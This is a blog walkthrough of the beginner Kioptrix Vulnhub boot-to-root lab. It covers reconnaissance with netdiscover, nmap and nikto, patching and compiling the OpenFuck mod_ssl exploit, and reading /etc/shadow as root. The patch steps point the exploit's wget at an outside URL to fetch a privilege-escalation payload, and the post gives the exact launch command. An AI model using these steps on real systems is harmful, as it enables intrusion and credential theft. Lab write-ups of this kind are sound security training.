---
layout: post
title: Vulnhub - Kioptrix 1.1 Walkthrough
tags: [Hacking, Vulnhub, CTF]
---
Kioptrix 1.1 is a Boot to Root CTF available [here](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/) on Vulnhub. It's difficulty is rated as Beginner. This write up is the first of a series I will be doing as I complete Abatchy's list of OSCP like Vulnhub VM's. 

The VM and my Kali instance are set up with NAT networking, so to discover the IP address of the VM I run netdiscover

![](/img/kioptrix1-1/netdiscover.png)

Once I obtain the IP, then run a nmap scan and find the following ports: 22, 80, 111, 139, 443 and 1024. 
![](/img/kioptrix1-1/nmap.png)

Visiting the websites on port 80 and 443 reveal just the default apache page. So I decide to run nikto to see if anything can be found.
![](/img/kioptrix1-1/nikto.png)

Nikto reveals something interesting - mod_ssl 2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a reverse shell (OSVDB-756). I give this a google and come across the [OpenFuckV2 exploit](http://www.exploit-db.com/exploits/764/) on ExploitDB. I download the exploit and attempt to compile, however I recieve a number of errors. I decide to again google to see if I can find any clues on compiling this exploit and I come across this [Blog Post](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/) and this [Reddit Post](https://www.reddit.com/r/HowToHack/comments/5q2rkp/help_compiling_a_c_exploit/). Combining the information from these two sources the process to get the exploit to work is as follows:

#### Add the following headers
{% highlight c %}
#### include <openssl/rc4.h>
#### include <openssl/md5.h>
{% endhighlight %}

#### Update the wget URL (found via searching for wget) to:
{% highlight c %}
http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
{% endhighlight %}

#### Update variable on line 961 from 
{% highlight c %}
unsigned char *p, *end;
{% endhighlight %}
to this:
{% highlight c %}
const unsigned char *p, *end;
{% endhighlight %}

#### Finally, install the libssl-dev library
{% highlight c %}
apt-get install libssl1.0-dev
{% endhighlight %}

Now I can compile the exploit using:
{% highlight bash %}
gcc -o OpenFuck 764.c -lcrypto
{% endhighlight %}

Running the exploit with no arguments presents the options for the exploit. It requires me to enter the code for the correct operating system and apache version number. From our Nikto scan we know that apache version 1.3.20 is the apache version and that the system is running Red Hat Linux. Looking at the options for the exploit we have two options. The following allowed the exploit to work.

{% highlight bash %}
./OpenFuck 0x6b 192.168.5.130 443 -c 40
{% endhighlight %}

The exploit runs successfully and I can see that I have root access via basic shell. 
![](/img/kioptrix1-1/access.png)

I tried to upgrade my shell by using:
{% highlight bash %}
echo os.system('/bin/bash')
{% endhighlight %}

However, this upgrades my shell as the apache user, so I run the exploit again and keep my root shell. As root I can view the /etc/shadow file and see there are other users, however there is nothing of interest in any of the home directories. Some further snooping, I finally find a email in /var/spool/mail/ and find the 'flag'.

![](/img/kioptrix1-1/flag.png)
